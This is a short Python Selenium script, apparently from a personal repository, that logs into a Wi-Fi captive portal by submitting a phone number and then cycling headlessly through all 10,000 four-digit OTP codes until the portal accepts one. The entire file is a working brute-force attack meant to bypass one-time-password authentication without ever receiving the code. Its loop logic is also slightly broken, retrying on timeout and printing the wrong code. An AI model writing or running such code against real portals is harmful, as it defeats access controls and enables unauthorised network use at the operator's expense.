# auto-login to captive portal by brute-forcing OTPs

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

from time import sleep

# from time import sleep

######################################################################

website_url = 'url_for_captive_portal'
id_dict = {'mob_num': 'cpusernameCL',
           'accept_agr': 'chktermsCL', 'already_otp': 'btnhaveotpCL', 'enter_otp': 'cppasswordCL', 'submit_otp': 'btnLoginCL'}
my_num = 'phone_number_for_login'

four_digit_number = ["%04d" % x for x in range(10000)]

######################################################################


firefox_options = webdriver.FirefoxOptions()
firefox_options.add_argument("--disable-extensions")
firefox_options.add_argument('--headless')
firefox_options.add_argument('--hide-scrollbars')
firefox_options.add_argument('--disable-gpu')
firefox_options.add_argument('--no-proxy-server')

driver = webdriver.Firefox(options=firefox_options)

driver.get(website_url)

# performing actions in browser
driver.find_element_by_id(id_dict['mob_num']).send_keys(my_num)
# print(driver.find_element_by_id(id_dict['mob_num']))
driver.find_element_by_id(id_dict['accept_agr']).send_keys(Keys.SPACE)
driver.find_element_by_id(id_dict['already_otp']).send_keys(Keys.RETURN)

count = 0
while (count < len(four_digit_number)):
    driver.find_element_by_id(id_dict['enter_otp']).clear()
    driver.find_element_by_id(
        id_dict['enter_otp']).send_keys(four_digit_number[count])

    driver.find_element_by_id(id_dict['submit_otp']).send_keys(Keys.RETURN)

    try:
        WebDriverWait(driver, 50).until(EC.element_to_be_clickable(
            (By.XPATH, "/html/body/div[4]/div/div[10]/button[1]"))).click()
    except TimeoutException:
        continue

    count += 1
    print(four_digit_number[count])